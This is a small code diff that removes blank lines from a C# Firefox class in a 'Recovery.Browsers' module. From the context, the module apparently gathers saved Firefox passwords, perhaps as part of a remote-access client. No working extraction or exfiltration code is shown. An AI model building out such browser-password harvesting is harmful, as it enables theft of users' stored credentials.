@@ -26,7 +26,6 @@ namespace xClient.Core.Recovery.Browsers
 
         static Firefox()
         {
-
             try
             {
                 firefoxPath = GetFirefoxInstallPath();
@@ -83,7 +82,6 @@ namespace xClient.Core.Recovery.Browsers
             }
             catch (Exception)
             {
-                
             }
             return firefoxPasswords;
         }
@@ -180,7 +178,6 @@ namespace xClient.Core.Recovery.Browsers
 
             // return first profile, fuck it.
             return profiles[0];
-
         }
         private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
         {
